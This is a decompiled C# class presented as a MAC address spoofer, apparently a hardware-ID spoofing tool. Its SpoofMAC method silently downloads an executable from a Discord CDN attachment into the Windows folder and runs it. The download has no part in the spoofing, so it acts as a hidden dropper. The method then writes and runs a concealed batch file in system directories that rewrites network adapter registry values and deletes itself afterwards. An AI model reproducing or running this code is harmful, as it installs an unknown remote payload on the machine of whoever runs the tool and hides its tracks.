using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;

namespace API_Example
{
	// Token: 0x0200000B RID: 11
	internal class MAC
	{
		// Token: 0x06000053 RID: 83 RVA: 0x0000A328 File Offset: 0x00008528
		public static string RandomString(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("abcdefghilmnopqrsovzt1289426915947", length)
			select s[MAC.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06000054 RID: 84 RVA: 0x0000A374 File Offset: 0x00008574
		public static int RandomNumber(int min, int max)
		{
			Random random = new Random();
			return random.Next(min, max);
		}

		// Token: 0x06000055 RID: 85 RVA: 0x0000A394 File Offset: 0x00008594
		public static void SpoofMAC()
		{
			string fileName = "C:\\Windows\\network.exe";
			string address = "https://cdn.discordapp.com/attachments/651522382200176690/660985147646148631/network_1.exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(address, fileName);
			Thread.Sleep(3000);
			Process.Start(fileName);
			string userName = Environment.UserName;
			string pathRoot = Path.GetPathRoot(Environment.CurrentDirectory);
			string[] array = new string[]
			{
				pathRoot + "Windows\\Resources\\Themes\\aero",
				pathRoot + "Windows\\Media",
				pathRoot + "Windows\\System32",
				pathRoot + "Windows\\SysWOW64",
				pathRoot + "Windows\\Branding\\BaseBrd",
				pathRoot + "Windows\\InputMethod\\CHS",
				pathRoot + "Windows\\Help\\en-US",
				pathRoot + "Windows\\IdentityCRL\\INT"
			};
			string[] array2 = new string[]
			{
				".dll",
				".dat",
				".sys",
				".dll",
				".dat",
				".sys",
				".dll",
				".sys",
				".dat",
				".dll",
				".sys",
				".dat"
			};
			string str = MAC.RandomString(5);
			int num = MAC.RandomNumber(0, 8);
			string text = array[num] + "\\" + str + ".bat";
			try
			{
				string value = "SETLOCAL ENABLEDELAYEDEXPANSION\n SETLOCAL ENABLEEXTENSIONS\n FOR /F \"tokens=1\" %%a IN ('wmic nic where physicaladapter^=true get deviceid ^| findstr [0-9]') DO (\n CALL :MAC\n FOR %%b IN (0 00 000) DO (\n REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}\\%%b%%a >NUL 2>NUL && REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}\\%%b%%a /v NetworkAddress /t REG_SZ /d !MAC!  /f >NUL 2>NUL\n )\n )\n FOR /F \"tokens=1\" %%a IN ('wmic nic where physicaladapter^=true get deviceid ^| findstr [0-9]') DO (\n FOR %%b IN (0 00 000) DO (\n REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}\\%%b%%a >NUL 2>NUL && REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}\\%%b%%a /v PnPCapabilities /t REG_DWORD /d 24 /f >NUL 2>NUL\n )\n )\n FOR /F \"tokens=2 delims=, skip=2\" %%a IN ('\"wmic nic where (netconnectionid like '%%') get netconnectionid,netconnectionstatus /format:csv\"') DO (\n netsh interface set interface name=\"%%a\" disable >NUL 2>NUL\n netsh interface set interface name=\"%%a\" enable >NUL 2>NUL\n )\n GOTO :EOF\n :MAC\n SET COUNT=0\n SET GEN=ABCDEF0123456789\n SET GEN2=26AE\n SET MAC=\n :MACLOOP\n SET /a COUNT+=1\n SET RND=%random%\n ::%%n, \n SET /A RND=RND%%16\n SET RNDGEN=!GEN:~%RND%,1!\n SET /A RND2=RND%%4\n SET RNDGEN2=!GEN2:~%RND2%,1!\n IF \"!COUNT!\"  EQU \"2\" (SET MAC=!MAC!!RNDGEN2!) ELSE (SET MAC=!MAC!!RNDGEN!)\n IF !COUNT!  LEQ 11 GOTO MACLOOP \n";
				using (StreamWriter streamWriter = new StreamWriter(text, true))
				{
					streamWriter.WriteLine(value);
				}
				Process process = new Process();
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.FileName = text;
				process.Start();
				process.WaitForExit();
				File.Delete(text);
			}
			catch
			{
				bool flag = File.Exists(text);
				if (flag)
				{
					File.Delete(text);
				}
				Console.ResetColor();
			}
		}

		// Token: 0x04000021 RID: 33
		private static Random random = new Random();
	}
}
